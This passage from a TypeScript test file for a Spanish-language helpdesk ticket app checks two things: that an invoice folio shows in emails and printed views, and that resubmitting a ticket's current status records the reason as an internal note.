    expect(t.emailSender.enviados.find((c) => c.tags?.includes('ticket-cerrado'))!.html).toContain('SER 1445');

    // A la vista: recuadro 🧾 Factura junto a respuestas y notas, en cada correo y al imprimir.
    expect(det.text).toContain('class="factura-box__folio" title="Folio de factura">SER 1445');
    t.emailSender.enviados.length = 0;
    await agent.post(`/app/tickets/${id}/nota`).type('form').send({ _csrf: csrf, cuerpo: 'Seguimos' });
    expect(t.emailSender.enviados[0]!.html).toContain('🧾 Factura: <strong>SER 1445</strong>');
    expect((await agent.get(`/app/tickets/${id}/imprimir`)).text).toContain('<strong>SER 1445</strong>');
  });
});

describe('🔄 estado del ticket', () => {
  it('el estado actual viene seleccionado; enviarlo sin cambiar solo guarda el motivo como nota interna', async () => {
    const ADMIN = { uid: 'u-adm3', email: 'adm3@dattasoft.mx', password: 'admin12345', nombre: 'Adm', rol: 'admin' as const };
    const t = makeTestApp({ usuarios: [ADMIN] });
    const { agent, csrf } = await login(t.app, ADMIN.email, ADMIN.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Estado actual', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    const estado = t.ticketStore.tickets.get(id)!.estado;
    const det = await agent.get(`/app/tickets/${id}`);
    expect(det.text).toContain(`<option value="${estado}" selected>${estado} (actual)</option>`);

    const r = await agent.post(`/app/tickets/${id}/estado`).type('form')
      .send({ _csrf: csrf, estado, estadoActual: estado, nota: 'Esperando respuesta del PAC' });
    expect(r.status).toBe(302);
    expect(t.ticketStore.tickets.get(id)!.estado).toBe(estado);
    expect((t.ticketStore.notas.get(id) ?? []).some((n) => n.tipo === 'interna' && n.cuerpo === 'Esperando respuesta del PAC')).toBe(true);
  });
});
